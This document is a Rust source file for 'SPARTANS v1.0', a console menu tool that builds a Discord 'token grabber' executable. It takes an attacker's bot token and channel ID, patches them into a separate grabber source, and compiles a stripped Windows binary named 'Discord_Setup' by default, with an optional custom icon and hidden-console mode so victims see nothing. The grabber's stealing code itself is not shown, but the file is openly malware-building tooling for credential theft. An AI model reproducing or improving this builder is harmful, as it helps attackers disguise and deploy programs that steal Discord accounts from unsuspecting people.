use std::io::{self, Write};
use std::fs;
use std::process::Command;
use std::path::Path;

struct CompileSettings {
    window_mode: String,
    output_name: String,
    icon_path: Option<String>,
}

impl CompileSettings {
    fn new() -> Self {
        CompileSettings {
            window_mode: String::from("visible"),
            output_name: String::from("Discord_Setup"),
            icon_path: None,
        }
    }

    fn show_status(&self) {
        println!("\n  Current settings:");
        println!("  Window Mode: {}", self.window_mode.to_uppercase());
        println!("  Output Name: {}.exe", self.output_name);
        if let Some(icon) = &self.icon_path {
            println!("  Icon: {}", icon);
        } else {
            println!("  Icon: None");
        }
    }
}

fn main() {
    let mut settings = CompileSettings::new();
    
    loop {
        print!("\x1B[2J\x1B[1;1H");
        println!("\n\n  SPARTANS v1.0\n");
        println!("  [1] Configure Discord Bot");
        println!("  [2] Compile Archive");
        println!("  [3] Windows Optimization");
        println!("  [0] Exit\n");
        print!("  > ");
        io::stdout().flush().unwrap();
        
        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();
        
        match input.trim() {
            "1" => config_bot(),
            "2" => compile_menu(&mut settings),
            "3" => windows_optimization(),
            "0" => break,
            _ => {}
        }
    }
}

fn config_bot() {
    print!("\x1B[2J\x1B[1;1H");
    println!("\n\n  CONFIGURE DISCORD BOT\n");
    
    // Check if config exists
    if let Ok(cfg) = fs::read_to_string("config.txt") {
        let lines: Vec<&str> = cfg.lines().collect();
        if lines.len() >= 2 {
            println!("  Current configuration:");
            println!("  Bot Token: {}...", &lines[0][..30.min(lines[0].len())]);
            println!("  Channel ID: {}\n", lines[1]);
        }
    }
    
    print!("  Bot Token: ");
    io::stdout().flush().unwrap();
    let mut token = String::new();
    io::stdin().read_line(&mut token).unwrap();
    
    if token.trim().is_empty() {
        println!("\n  [!] Cancelled\n");
        pause();
        return;
    }
    
    print!("  Channel ID: ");
    io::stdout().flush().unwrap();
    let mut channel = String::new();
    io::stdin().read_line(&mut channel).unwrap();
    
    if channel.trim().is_empty() {
        println!("\n  [!] Cancelled\n");
        pause();
        return;
    }
    
    let cfg = format!("{}\n{}", token.trim(), channel.trim());
    fs::write("config.txt", cfg).ok();
    println!("\n  [OK] Configuration saved!\n");
    pause();
}

fn compile_menu(settings: &mut CompileSettings) {
    loop {
        print!("\x1B[2J\x1B[1;1H");
        println!("\n\n  COMPILE ARCHIVE\n");
        println!("  [1] Compile Token Grabber");
        println!("  [2] Compile Custom Archive");
        println!("  [0] Back to Main Menu\n");
        print!("  > ");
        io::stdout().flush().unwrap();
        
        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();
        
        match input.trim() {
            "1" => compile_grabber_menu(settings),
            "2" => compile_custom(),
            "0" => break,
            _ => {}
        }
    }
}

fn compile_grabber_menu(settings: &mut CompileSettings) {
    loop {
        print!("\x1B[2J\x1B[1;1H");
        println!("\n\n  COMPILE TOKEN GRABBER\n");
        settings.show_status();
        println!("\n  Configuration:");
        println!("  [1] Window Mode (Show/Hide console)");
        println!("  [2] Output Name");
        println!("  [3] Icon File");
        println!("  [4] Start Compilation");
        println!("  [0] Back\n");
        print!("  > ");
        io::stdout().flush().unwrap();
        
        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();
        
        match input.trim() {
            "1" => configure_window_mode(settings),
            "2" => configure_output_name(settings),
            "3" => configure_icon(settings),
            "4" => {
                compile_token_grabber(settings);
                break;
            }
            "0" => break,
            _ => {}
        }
    }
}

fn configure_window_mode(settings: &mut CompileSettings) {
    print!("\x1B[2J\x1B[1;1H");
    println!("\n\n  WINDOW MODE\n");
    println!("  Choose window mode:\n");
    println!("  [1] Visible (Show console window)");
    println!("  [2] Hidden (Run silently)\n");
    print!("  > ");
    io::stdout().flush().unwrap();
    
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    
    match input.trim() {
        "1" => {
            settings.window_mode = String::from("visible");
            println!("\n  [OK] Set to: VISIBLE\n");
        }
        "2" => {
            settings.window_mode = String::from("hidden");
            println!("\n  [OK] Set to: HIDDEN\n");
        }
        _ => {
            println!("\n  [!] Invalid option\n");
        }
    }
    
    pause();
}

fn configure_output_name(settings: &mut CompileSettings) {
    print!("\x1B[2J\x1B[1;1H");
    println!("\n\n  OUTPUT NAME\n");
    println!("  Current: {}.exe\n", settings.output_name);
    print!("  New name (without .exe): ");
    io::stdout().flush().unwrap();
    
    let mut name = String::new();
    io::stdin().read_line(&mut name).unwrap();
    let name = name.trim();
    
    if !name.is_empty() {
        let name = if name.ends_with(".exe") {
            &name[..name.len()-4]
        } else {
            name
        };
        settings.output_name = String::from(name);
        println!("\n  [OK] Output name set to: {}.exe\n", name);
    } else {
        println!("\n  [!] Name not changed\n");
    }
    
    pause();
}

fn configure_icon(settings: &mut CompileSettings) {
    print!("\x1B[2J\x1B[1;1H");
    println!("\n\n  ICON FILE\n");
    
    if let Some(icon) = &settings.icon_path {
        println!("  Current: {}\n", icon);
    } else {
        println!("  No icon selected\n");
    }
    
    println!("  Enter icon path (or leave empty for no icon):\n");
    print!("  Path: ");
    io::stdout().flush().unwrap();
    
    let mut path = String::new();
    io::stdin().read_line(&mut path).unwrap();
    let path = path.trim().trim_matches('"');
    
    if !path.is_empty() {
        if !Path::new(path).exists() {
            println!("\n  [!] File not found\n");
        } else if !path.to_lowercase().ends_with(".ico") {
            println!("\n  [!] File must be .ico format\n");
        } else {
            settings.icon_path = Some(String::from(path));
            println!("\n  [OK] Icon set\n");
        }
    } else {
        settings.icon_path = None;
        println!("\n  [!] Icon removed\n");
    }
    
    pause();
}

fn compile_token_grabber(settings: &CompileSettings) {
    print!("\x1B[2J\x1B[1;1H");
    println!("\n\n  COMPILING TOKEN GRABBER\n");
    
    // Check if config exists
    if !Path::new("config.txt").exists() {
        println!("  [!] Bot not configured");
        println!("  [*] Configure it first (Option 1)\n");
        pause();
        return;
    }
    
    // Check if grabber source exists (relative to SPARTANS.exe location)
    let grabber_src = Path::new("utilitys/token-grabber/main.rs");
    if !grabber_src.exists() {
        println!("  [!] Grabber source not found");
        println!("  [*] Expected: utilitys/token-grabber/main.rs");
        println!("  [*] Make sure you're running SPARTANS.exe from SPARTANS folder\n");
        pause();
        return;
    }
    
    println!("  Configuration:");
    settings.show_status();
    println!("\n  [*] Starting compilation...\n");
    
    // Read config
    let cfg = match fs::read_to_string("config.txt") {
        Ok(c) => c,
        Err(_) => {
            println!("  [ERROR] Cannot read config\n");
            pause();
            return;
        }
    };
    
    let lines: Vec<&str> = cfg.lines().collect();
    if lines.len() < 2 {
        println!("  [ERROR] Invalid config\n");
        pause();
        return;
    }
    
    let bot_token = lines[0].trim();
    let channel_id = lines[1].trim();
    
    println!("  [1/4] Reading grabber source...");
    
    // Read original grabber source
    let grabber_code = match fs::read_to_string(grabber_src) {
        Ok(code) => code,
        Err(_) => {
            println!("  [ERROR] Cannot read grabber source\n");
            pause();
            return;
        }
    };
    
    // Replace placeholders with actual values
    let modified_code = grabber_code
        .replace("YOUR_BOT_TOKEN_HERE", bot_token)
        .replace("YOUR_CHANNEL_ID_HERE", channel_id);
    
    println!("  [2/4] Creating temporary project...");
    
    // Create temporary project
    let _ = fs::remove_dir_all("grabber_tmp");
    fs::create_dir_all("grabber_tmp/src").ok();
    
    // Write modified source
    fs::write("grabber_tmp/src/main.rs", modified_code).ok();
    
    // Create Cargo.toml
    let cargo_toml = r#"[package]
name = "discord-grabber"
version = "1.0.0"
edition = "2021"

[profile.release]
opt-level = "z"
lto = true
strip = true
codegen-units = 1
panic = "abort"

[dependencies]
"#;
    
    fs::write("grabber_tmp/Cargo.toml", cargo_toml).ok();
    
    println!("  [3/4] Compiling... (30-90 seconds)");
    println!("  [*] This may take a while...\n");
    
    // Compile with appropriate flags based on window mode
    let mut cmd = Command::new("cargo");
    cmd.current_dir("grabber_tmp")
        .arg("build")
        .arg("--release")
        .arg("--target")
        .arg("x86_64-pc-windows-gnu");
    
    // Add windows subsystem flag if hidden mode
    if settings.window_mode == "hidden" {
        // Create .cargo/config.toml for hidden window
        fs::create_dir_all("grabber_tmp/.cargo").ok();
        let cargo_config = r#"[target.x86_64-pc-windows-gnu]
rustflags = ["-C", "link-args=-Wl,--subsystem,windows"]
"#;
        fs::write("grabber_tmp/.cargo/config.toml", cargo_config).ok();
    }
    
    let output = cmd.output();
    
    match output {
        Ok(o) if o.status.success() => {
            println!("  [4/4] Copying to Desktop...");
            
            let exe_path = Path::new("grabber_tmp/target/x86_64-pc-windows-gnu/release/discord-grabber.exe");
            
            if exe_path.exists() {
                // Save to SPARTANS folder (same directory as SPARTANS.exe)
                let output_filename = format!("{}.exe", settings.output_name);
                let output_path = Path::new(&output_filename);
                
                if fs::copy(exe_path, &output_path).is_ok() {
                    println!("\n  ========================================");
                    println!("            SUCCESS!");
                    println!("  ========================================\n");
                    println!("  File: {}.exe", settings.output_name);
                    
                    if let Ok(metadata) = fs::metadata(&output_path) {
                        let size_mb = metadata.len() as f64 / 1024.0 / 1024.0;
                        println!("  Size: {:.2} MB", size_mb);
                    }
                    
                    println!("  Location: SPARTANS\\ (same folder)\n");
                    
                    if settings.window_mode == "hidden" {
                        println!("  [!] Window mode: HIDDEN");
                        println!("  [!] Console will NOT be visible when run\n");
                    } else {
                        println!("  [*] Window mode: VISIBLE");
                        println!("  [*] Console will be visible when run\n");
                    }
                    
                    println!("  Bot configured:");
                    println!("  Token: {}...", &bot_token[..30.min(bot_token.len())]);
                    println!("  Channel: {}\n", channel_id);
                } else {
                    println!("\n  [ERROR] Failed to copy to SPARTANS folder\n");
                }
            } else {
                println!("\n  [ERROR] EXE not found after compilation\n");
            }
        }
        Ok(o) => {
            println!("\n  [ERROR] Compilation failed\n");
            
            let stderr = String::from_utf8_lossy(&o.stderr);
            if !stderr.is_empty() {
                println!("  Error details:");
                for line in stderr.lines().take(10) {
                    println!("  {}", line);
                }
                println!();
            }
            
            println!("  Make sure:");
            println!("  1. Rust is installed: cargo --version");
            println!("  2. Target is added: rustup target add x86_64-pc-windows-gnu\n");
        }
        Err(e) => {
            println!("\n  [ERROR] Cannot run cargo: {}\n", e);
            println!("  Make sure Rust is installed properly\n");
        }
    }
    
    // Cleanup temporary files
    println!("  [*] Cleaning up...");
    let _ = fs::remove_dir_all("grabber_tmp");
    println!("  [OK] Cleanup complete\n");
    
    pause();
}

fn compile_custom() {
    print!("\x1B[2J\x1B[1;1H");
    println!("\n\n  COMPILE CUSTOM ARCHIVE\n");
    println!("  This feature allows you to compile custom Rust projects.\n");
    println!("  Enter path to your main.rs file:\n");
    print!("  Path: ");
    io::stdout().flush().unwrap();
    
    let mut path = String::new();
    io::stdin().read_line(&mut path).unwrap();
    let path = path.trim().trim_matches('"');
    
    if path.is_empty() {
        println!("\n  [!] Cancelled\n");
        pause();
        return;
    }
    
    if !Path::new(path).exists() {
        println!("\n  [!] File not found: {}\n", path);
        pause();
        return;
    }
    
    println!("\n  [*] Feature under development");
    println!("  [*] For now, use the Token Grabber compiler (Option 2-1)\n");
    pause();
}

fn windows_optimization() {
    print!("\x1B[2J\x1B[1;1H");
    println!("\n\n  WINDOWS OPTIMIZATION\n");
    
    // Check if optimizer exists (relative to SPARTANS.exe)
    let optimizer_path = Path::new("utilitys/windows-optimization/optimizer.py");
    
    if !optimizer_path.exists() {
        println!("  [!] Windows Optimizer not found");
        println!("  [*] Expected: utilitys/windows-optimization/optimizer.py\n");
        println!("  To add Windows Optimizer:");
        println!("    1. Place optimizer.py in: utilitys\\windows-optimization\\");
        println!("    2. Restart SPARTANS and try again\n");
        pause();
        return;
    }
    
    println!("  [*] Launching Windows Optimizer...\n");
    
    let result = Command::new("python")
        .arg(optimizer_path)
        .status();
    
    match result {
        Ok(status) => {
            if status.success() {
                println!("\n  [OK] Optimizer closed successfully\n");
            } else {
                println!("\n  [!] Optimizer exited with error code\n");
            }
        }
        Err(e) => {
            println!("\n  [ERROR] Failed to launch optimizer: {}\n", e);
            println!("  Make sure:");
            println!("  1. Python is installed: python --version");
            println!("  2. Python is in PATH\n");
        }
    }
    
    pause();
}

fn pause() {
    print!("\n  Press Enter to continue...");
    io::stdout().flush().unwrap();
    let mut buffer = String::new();
    io::stdin().read_line(&mut buffer).ok();
}
